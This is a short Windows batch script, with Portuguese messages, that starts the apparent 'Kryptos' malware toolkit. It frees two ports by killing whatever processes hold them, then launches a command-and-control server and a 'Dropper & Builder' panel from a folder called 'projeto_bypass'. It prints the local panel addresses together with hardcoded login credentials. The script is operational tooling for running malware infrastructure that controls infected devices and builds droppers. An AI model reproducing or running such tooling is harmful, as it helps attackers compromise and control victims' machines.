@echo off
chcp 65001 >nul
title Iniciar Projeto Kryptos C&C + Painel
echo =======================================================================
echo               âš¡ ATIVANDO PROJETO KRYPTOS REMOTE âš¡
echo =======================================================================
echo.

set "ROOT_DIR=%~dp0"
set "SERVER_DIR=%ROOT_DIR%server"
set "BYPASS_DIR=%SERVER_DIR%\projeto_bypass"

echo [1/3] Liberando portas 7771 e 8088...
powershell -Command "Get-NetTCPConnection -LocalPort 7771,8088 -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue }" >nul 2>&1

echo [2/3] Iniciando Servidor C&C (Porta 7771)...
start "Kryptos C&C Server (7771)" /D "%SERVER_DIR%" python main.py

timeout /t 2 /nobreak >nul

echo [3/3] Iniciando Painel Dropper & Builder (Porta 8088)...
start "Kryptos Builder/Bypass (8088)" /D "%BYPASS_DIR%" python app.py

echo.
echo =======================================================================
echo   ðŸš€ SERVIDORES INICIADOS COM SUCESSO!
echo.
echo   ðŸ“Œ Painel C&C / Dispositivos:  http://localhost:7771
echo      UsuÃ¡rio: admin
echo      Senha:   admin
echo.
echo   ðŸ“Œ Painel Dropper & Builder:   http://localhost:8088/login
echo      UsuÃ¡rio: risadinhaxx7@@
echo      Senha:   risadinhaxx7@@
echo =======================================================================
echo.
pause
